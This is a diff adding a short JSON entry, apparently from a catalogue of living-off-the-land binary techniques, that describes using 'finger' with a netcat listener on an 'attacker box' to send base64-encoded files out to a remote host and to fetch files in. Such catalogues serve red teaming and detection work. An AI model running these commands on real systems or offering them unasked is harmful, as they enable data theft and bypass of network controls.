@@ -1,0 +1,17 @@
+{
+  "description": "'finger' hangs waiting for the remote peer to close the socket.",
+  "functions": {
+    "file-upload": [
+      {
+        "description": "Send a binary file to a TCP port. Run 'sudo nc -l -p 79 | base64 -d > [file]' on the attacker box to collect the file. The file length is limited by the maximum size of arguments.",
+        "code": "finger \"$(base64 [file])@[host]\"\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch remote binary file from a remote TCP port. Run 'base64 [file] | sudo nc -l -p 79' on the attacker box to send the file.",
+        "code": "finger x@[host] | base64 -d > [file]\n"
+      }
+    ]
+  }
+}
